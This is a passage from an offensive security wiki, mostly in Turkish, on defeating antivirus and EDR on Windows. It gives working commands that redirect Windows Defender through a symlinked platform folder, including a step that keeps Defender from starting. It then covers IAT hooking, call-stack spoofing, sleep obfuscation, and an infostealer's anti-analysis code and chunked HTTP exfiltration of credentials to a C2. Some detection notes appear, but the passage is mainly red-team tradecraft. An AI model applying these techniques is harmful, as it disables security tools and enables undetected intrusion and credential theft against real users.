set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) yeniden yönlendirilmiş yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunu `C:\TMP\AV\` altında ve hizmet yapılandırmasının/kayıt defterinin bu konumu yansıttığını gözlemlemelisiniz.

Post-exploitation options
- DLL sideloading/code execution: Defender'ın uygulama dizininden yüklediği DLLs'i bırakıp/değiştirerek Defender süreçlerinde kod çalıştırın. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink'i kaldırın; böylece bir sonraki başlatmada yapılandırılmış yol çözülmez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu teknik kendi başına ayrıcalık yükseltme sağlamaz; yönetici hakları gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, runtime evasion'ı C2 implantından hedef modülün kendisine taşıyabilir; bunun için Import Address Table (IAT)'ı hooklayıp seçili API'leri saldırgan kontrolündeki position‑independent code (PIC) üzerinden yönlendirir. Bu, birçok kitin ortaya koyduğu küçük API yüzeyinin ötesinde evasion'u genelleştirir (ör. CreateProcessA) ve aynı korumaları BOFs ile post‑exploitation DLL'lerine de genişletir.

Yüksek düzey yaklaşım
- Reflective loader kullanarak hedef modülle birlikte bir PIC blob'u yerleştirin (prepended veya companion). PIC kendi içinde bağımsız ve position‑independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR'ı dolaşın ve hedeflenen importlar (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) için IAT girdilerini ince PIC wrapper'larına işaret edecek şekilde patch'leyin.
- Her PIC wrapper gerçek API adresine tail‑call yapmadan önce evasions uygular. Tipik evasions şunlardır:
  - Çağrı etrafında bellek maskeleme/maske kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa isimleri/izinlerini değiştirme) ve çağrı sonrası geri yükleme.
  - Call‑stack spoofing: zararsız bir stack inşa edip hedef API'ye geçiş yaparak call‑stack analizinin beklenen frame'lere çözülmesini sağlama.
- Uyumluluk için bir arayüz export edin; böylece bir Aggressor scripti (veya eşdeğeri) Beacon, BOFs ve post‑ex DLL'ler için hangi API'lerin hooklanacağını kayıt edebilir.

Why IAT hooking here
- Hooklanan importu kullanan herhangi bir kod için çalışır; araç kodunu değiştirmeye veya belirli API'leri proxy'lemek için Beacon'a güvenmeye gerek yoktur.
- Post‑ex DLL'leri kapsar: LoadLibrary* hooklamak module yüklemelerini (ör. System.Management.Automation.dll, clr.dll) kesintiye uğratmanıza ve aynı maskelenme/stack evasion'u onların API çağrılarına uygulamanıza izin verir.
- CreateProcessA/W'yi sararak call‑stack–tabanlı tespitlere karşı process‑spawning post‑ex komutlarının güvenilir kullanımını geri kazandırır.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yaması relocations/ASLR'den sonra ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loaders, yüklenen modülün DllMain sırasında hooking örnekleri gösterir.
- Sarmalayıcıları küçük ve PIC-safe tutun; gerçek API'yi yama yapmadan önce yakaladığınız orijinal IAT değeri üzerinden veya LdrGetProcedureAddress ile çözün.
- PIC için RW → RX geçişleri kullanın ve writable+executable sayfalar bırakmaktan kaçının.

Call‑stack spoofing stub
- Draugr‑style PIC stubs zararsız modüllere dönüş adresleri içeren sahte bir çağrı zinciri oluşturur ve ardından gerçek API'ye pivot yapar.
- Bu, Beacon/BOFs'tan hassas API'lere kadar kanonik yığınlar bekleyen tespitleri atlatır.
- API prologue'dan önce beklenen çerçevelerin içine yerleşmek için stack cutting/stack stitching techniques ile eşleştirin.

Operasyonel entegrasyon
- Reflective loader'ı post‑ex DLL'lerin önüne ekleyin, böylece DLL yüklendiğinde PIC ve hooks otomatik olarak başlatılır.
- Bir Aggressor script kullanarak hedef API'leri register edin; böylece Beacon ve BOFs aynı evasion yolundan şeffaf şekilde faydalanır, kod değişikliği gerekmez.

Tespit/DFIR hususları
- IAT integrity: non‑image (heap/anon) adreslere çözümlenen girişler; import işaretçilerinin periyodik doğrulanması.
- Stack anomalies: yüklü imgelere ait olmayan return adresleri; non‑image PIC'e ani geçişler; tutarsız RtlUserThreadStart soyağacı.
- Loader telemetry: süreç içi IAT yazmaları, import thunk'larını değiştiren erken DllMain etkinliği, yükleme sırasında oluşturulan beklenmeyen RX bölgeleri.
- Image‑load evasion: eğer LoadLibrary* hook'lanıyorsa, memory masking olayları ile korelasyonlu şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Reflective loaders that perform IAT patching during load (ör., TitanLdr, AceLdr)
- Memory masking hooks (ör., simplehook) ve stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (ör., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A işlem listesini gezer, her adı özel bir rolling checksum ile hashler ve gömülü debugger/sandbox blocklist'leriyle karşılaştırır; checksum'u bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B sistem özelliklerini (process-count alt sınırı, son uptime), VirtualBox eklentilerini tespit etmek için `OpenServiceA("VBoxGuest")` çağrısını ve tek adımlı stepping tespiti için uyku süreleri etrafında timing kontrolleri yapar. Herhangi bir tespit, modüller başlatılmadan önce işlemi sonlandırır.

### Dosyasız helper + double ChaCha20 reflective loading

- Birincil DLL/EXE, ya diske düşürülen ya da belleğe manuel olarak map edilen bir Chromium credential helper'ı gömüyor; dosyasız modda helper import/relocation'larını kendisi çözümlüyor, böylece hiçbir yardımcı artefakt diske yazılmıyor.
- Bu helper, ikinci aşama DLL'yi iki kez ChaCha20 ile şifreliyor (iki 32-bayt anahtar + 12-bayt nonce). Her iki geçişin ardından blob'u reflectively load ediyor (no `LoadLibrary`) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)'dan türetilen `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırıyor.
- ChromElevator rutinleri, canlı bir Chromium tarayıcısına enjekte etmek için direct-syscall reflective process hollowing kullanıyor, AppBound Encryption anahtarlarını devralıyor ve ABE sertleştirmesine rağmen parolaları/cookie'leri/kredi kartlarını doğrudan SQLite veritabanlarından çözüyor.


### Modüler bellek içi toplama & parçalı HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer tablosunda iterasyon yapar ve etkin her modül için (Telegram, Discord, Steam, ekran görüntüleri, belgeler, browser extensions, vb.) bir iş parçacığı spawn eder. Her iş parçacığı sonuçları paylaşılan buffer'lara yazar ve ~45s'lik join penceresinden sonra dosya sayısını raporlar.
- Bitince, her şey statically linked `miniz` kütüphanesi ile `%TEMP%\\Log.zip` olarak ziplenir. `ThreadPayload1` sonra 15s uyur ve arşivi 10 MB'lık parçalar halinde HTTP POST ile `http://<C2>:6767/upload` adresine stream eder, bir tarayıcı `multipart/form-data` boundary'si (`----WebKitFormBoundary***`) taklit eder. Her parça `User-Agent: upload`, `auth: <build_id>`, opsiyonel `w: <campaign_tag>` ekler ve son parça `complete: true` ekleyerek C2'nin yeniden birleştirmenin tamamlandığını bilmesini sağlar.

## Referanslar

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
